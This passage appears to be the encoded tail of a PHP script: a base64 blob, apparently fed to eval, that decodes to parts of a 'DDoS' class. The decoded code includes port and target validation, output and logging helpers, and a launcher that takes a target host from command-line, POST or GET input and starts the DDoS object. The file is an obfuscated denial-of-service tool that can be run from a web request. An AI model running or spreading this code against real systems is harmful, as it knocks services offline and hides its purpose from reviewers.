cy0+bG9nKCdTZXR0aW5nIENvbnRlbnQtVHlwZSBoZWFkZXIgdG8gJyAuICR0aGlzLT5jb250ZW50X3R5cGUsIERET1NfTE9HX0RFQlVHKTsKCX0KCQoJCgkvKioKCSAqIENoZWNrIGlmIHdlIGFyZSBydW5uaW5nIHRoZSBzY3JpcHQgZnJvbSB0ZXJtaW5hbCBvciBmcm9tIGEgd2ViIHNlcnZlcgoJICogQHJldHVybiBib29sZWFuIFRydWUgaWYgc2FwaSBuYW1lIGlzIGNsaQoJICovCglwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGlzX2NsaSgpIHsKCQlyZXR1cm4gcGhwX3NhcGlfbmFtZSgpID09ICdjbGknOwoJfQoJCgoJLyoqCgkgKiBHZXQgcmFuZG9tIHBvcnQgbnVtYmVyCgkgKiBAcmV0dXJuIG51bWJlcgoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0X3JhbmRvbV9wb3J0KCkgewoJCXJldHVybiByYW5kKDEsNjU1MzUpOwoJfQoJCgkKCS8qKgoJICogQ2hlY2sgaWYgdGhlIHBvcnQgaXMgdmFsaWQKCSAqIEBwYXJhbSAJaW50ZWdlciAJJHBvcnQKCSAqIEByZXR1cm4gCWludGVnZXIgCVBvcnQgbnVtYmVyIG9yIDAgaWYgaW52YWxpZAoJICovCglmdW5jdGlvbiBpc192YWxpZF9wb3J0KCRwb3J0ID0gMCl7CgkJcmV0dXJuICgkcG9ydCA+PSAxICYmICAkcG9ydCA8PSA2NTUzNSkgPyAkcG9ydCA6IDA7Cgl9CgkKCQoJLyoqCgkgKiBDaGVjayBpZiB0aGUgaG9zdCBuYW1lIG9yIHRoZSBpcCBhZGRyZXNzIGFyZSB2YWxpZAoJICogQHNlZQlodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Ib3N0bmFtZQoJICogQHBhcmFtIHN0cmluZyAkdGFyZ2V0CgkgKiBAcmV0dXJuIGJvb2xlYW4KCSAqLwoJZnVuY3Rpb24gaXNfdmFsaWRfdGFyZ2V0KCR0YXJnZXQpIHsKCQlyZXR1cm4gCSgJLy92YWxpZCBjaGFycyBjaGVjawoJCQkJcHJlZ19tYXRjaCgiL14oW2EtelxkXSgtKlthLXpcZF0pKikoXC4oW2EtelxkXSgtKlthLXpcZF0pKikpKiQvaSIsICR0YXJnZXQpCgkJCQkvL292ZXJhbGwgbGVuZ3RoIGNoZWNrCgkJCQkmJiAJcHJlZ19tYXRjaCgiL14uezEsMjUzfSQvIiwgJHRhcmdldCkKCQkJCS8vIFZhbGlkYXRlIGVhY2ggbGFiZWwKCQkJCSYmIAlwcmVnX21hdGNoKCIvXlteXC5dezEsNjN9KFwuW15cLl17MSw2M30pKiQvIiwgJHRhcmdldCkKCQkpCgkJfHwJZmlsdGVyX3ZhcigkdGFyZ2V0LCBGSUxURVJfVkFMSURBVEVfSVApOwoJfQoJCgkKCS8qKgoJICogQ29udmVydCBmcm9tIGJ5dGVzIHRvIGh1bWFuIHJlYWRhYmxlIHNpemUKCSAqIEBwYXJhbSBpbnRlZ2VyICRieXRlcwoJICogQHBhcmFtIGludGVnZXIgJHByZWNpc2lvbiBEZWZhdWx0OjIKCSAqIEByZXR1cm4gc3RyaW5nCgkgKi8KCWZ1bmN0aW9uIGZvcm1hdF9ieXRlcygkYnl0ZXMsICRkZWMgPSAyKSB7CgkJLy8gZXhhZ2dlcmF0aW5nIDopCgkJJHNpemUgICA9IGFycmF5KCdCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJywgJ0VCJywgJ1pCJywgJ1lCJyk7CgkJJGZhY3RvciA9IGZsb29yKChzdHJsZW4oJGJ5dGVzKSAtIDEpIC8gMyk7CgkJcmV0dXJuIHNwcmludGYoIiUueyRkZWN9ZiIsICRieXRlcyAvIHBvdygxMDI0LCAkZmFjdG9yKSkgLiBAJHNpemVbJGZhY3Rvcl07Cgl9CgkKCQoJLyoqCgkgKiBQcmVwYXJlIHRoZSBvdXRwdXQgZGF0YS4gdG8gYmUgcHJpbnRlZCBpbiB0aGUgY29ycmVjdCBmb3JtYXQgbGF0ZXIKCSAqIEBwYXJhbSBzdHJpbmcgCSRtZXNzYWdlCgkgKiBAcGFyYW0gaW50ZWdlciAJJGNvZGUKCSAqIEBwYXJhbSBtaXhlZCAJJGRhdGEKCSAqLwoJcHJpdmF0ZSBmdW5jdGlvbiBzZXRfb3V0cHV0KCRtZXNzYWdlLCAkY29kZSwgJGRhdGEgPSBudWxsKSB7CgkJCgkJJHRoaXMtPm91dHB1dD0gYXJyYXkoInN0YXR1cyIgPT4kY29kZSwibWVzc2FnZSIgPT4gJG1lc3NhZ2UpOwoJCWlmKG51bGwgIT0gJGRhdGEpIHsKCQkJJHRoaXMtPm91dHB1dFsnZGF0YSddID0gJGRhdGE7CgkJfQoJfSAKCQoJLyoqCgkgKiBQcmludCB0aGUgb3V0cHV0IG9mIHRoZSBzY3JpcHQKCSAqLwoJcHJpdmF0ZSBmdW5jdGlvbiBwcmludF9vdXRwdXQoKSB7CgkJc3dpdGNoKCR0aGlzLT5nZXRfcGFyYW0oJ2Zvcm1hdCcpKSB7CgkJCWNhc2UgRERPU19PVVRQVVRfRk9STUFUX0pTT046IHsKCQkJCWVjaG8ganNvbl9lbmNvZGUoJHRoaXMtPm91dHB1dCk7CQoJCQkJYnJlYWs7CgkJCX0KCQkJCgkJCWNhc2UgRERPU19PVVRQVVRfRk9STUFUX1hNTDogewoJCQkJJHhtbCA9IG5ldyBTaW1wbGVYTUxFbGVtZW50KCc8cm9vdC8+Jyk7CgkJCQlhcnJheV93YWxrX3JlY3Vyc2l2ZSgkdGhpcy0+b3V0cHV0LCBmdW5jdGlvbigkdmFsdWUsICRrZXkpdXNlKCR4bWwpewoJCQkJCSR4bWwtPmFkZENoaWxkKCRrZXksICR2YWx1ZSk7CgkJCQl9KTsKCQkJCXByaW50ICR4bWwtPmFzWE1MKCk7CgkJCQlicmVhazsKCQkJfQoJCQkKCQkJZGVmYXVsdDogewoJCQkJJHRoaXMtPnByaW50bG4oKTsKCQkJCWFycmF5X3dhbGtfcmVjdXJzaXZlKCR0aGlzLT5vdXRwdXQsIGZ1bmN0aW9uKCR2YWx1ZSwgJGtleSkgewoJCQkJCSR0aGlzLT5wcmludGxuKCRrZXkgLic6ICcgLiAkdmFsdWUpOwoJCQkJfSk7CgkJCX0KCQl9Cgl9CgkKCS8qKgoJICogTG9nZ2luZyBzeXN0ZW0sIHZlcnkgdXNlZnVsIGZvciBkZWJ1Z2dpbmcKCSAqCgkgKiBAcGFyYW0gc3RyaW5nIAkkbWVzc2FnZSAJTWVzc2FnZQoJICogQHBhcmFtIGludGVnZXIgCSRjb2RlCQlMb2cgY29kZQoJICovCglwcml2YXRlIGZ1bmN0aW9uIGxvZygkbWVzc2FnZSwkY29kZSA9IERET1NfTE9HX0lORk8pIHsKCQlpZigkY29kZSA8PSAkdGhpcy0+Z2V0X3BhcmFtKCd2ZXJib3NlJykgJiYgJHRoaXMtPmdldF9wYXJhbSgnZm9ybWF0JykgPT0gRERPU19PVVRQVVRfRk9STUFUX1RFWFQpIHsKCQkJJHRoaXMtPnByaW50bG4oJ1snLiR0aGlzLT5sb2dfbGFiZWxzWyRjb2RlXSAuICddICcgLiAkbWVzc2FnZSk7CQoJCX0KCX0KCQoJLyoqCgkgKiBTYXZlIG91dHB1dCB0byBmaWxlCgkgKiBAcGFyYW0gdW5rbm93biAkbWVzc2FnZQoJICovCglwcml2YXRlIGZ1bmN0aW9uIGxvZ190b19maWxlKCRtZXNzYWdlKSB7CgkJaWYoJycgIT0gJHRoaXMtPmdldF9wYXJhbSgnb3V0cHV0JykpIHsKCQkJZmlsZV9wdXRfY29udGVudHMoJHRoaXMtPmdldF9wYXJhbSgnb3V0cHV0JyksICRtZXNzYWdlLCBGSUxFX0FQUEVORCB8IExPQ0tfRVgpOwoJCX0JCgl9CgkKCQoJLyoqCgkgKiBQcmludHMgYSBtZXNzYWdlIHdpdGggYSBjYXJyaWFnZSByZXR1cm4KCSAqIEBwYXJhbSBzdHJpbmcgCSRtZXNzYWdlIE1lc3NhZ2UgdG8gcHJpbnQKCSAqIEBwYXJhbSBpbnRlZ2VyIAkkaW5kZW50IE51bWJlciBvZiB0YWJzIHRvIHByaW50IGJlZm9yZSB0aGUgbWVzc2FnZQoJICovCglwcml2YXRlIGZ1bmN0aW9uIHByaW50bG4oJG1lc3NhZ2UgPSAnJykgewoJCWVjaG8gJG1lc3NhZ2UgLiAiXG4iOwoJCSR0aGlzLT5sb2dfdG9fZmlsZSgkbWVzc2FnZSAuICJcbiIpOwoJCW9iX2ZsdXNoKCk7CgkJZmx1c2goKTsKCX0KfQoKCgokcGFyYW1zID0gYXJyYXkoKTsKaWYoRERvUzo6aXNfY2xpKCkpIHsKCWdsb2JhbCAkYXJndjsKCXBhcnNlX3N0cihpbXBsb2RlKCcmJywgYXJyYXlfc2xpY2UoJGFyZ3YsIDEpKSwgJHBhcmFtcyk7Cn0KZWxzZWlmKCFlbXB0eSgkX1BPU1QpKSB7Cglmb3JlYWNoKCRfUE9TVCBhcyAkaW5kZXggPT4gJHZhbHVlKSB7CgkJJHBhcmFtc1skaW5kZXhdID0gaHRtbHNwZWNpYWxjaGFycygkdmFsdWUsIEVOVF9RVU9URVMsICdVVEYtOCcpOwoJfQp9CmVsc2VpZighZW1wdHkoJF9HRVRbJ2hvc3QnXSkpIHsKCWZvcmVhY2goJF9HRVQgYXMgJGluZGV4ID0+ICR2YWx1ZSkgewoJCSRwYXJhbXNbJGluZGV4XSA9IGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlLCBFTlRfUVVPVEVTLCAnVVRGLTgnKTsKCX0KfQoKCiRkZG9zID0gbmV3IEREb1MoJHBhcmFtcyk7
"));?>
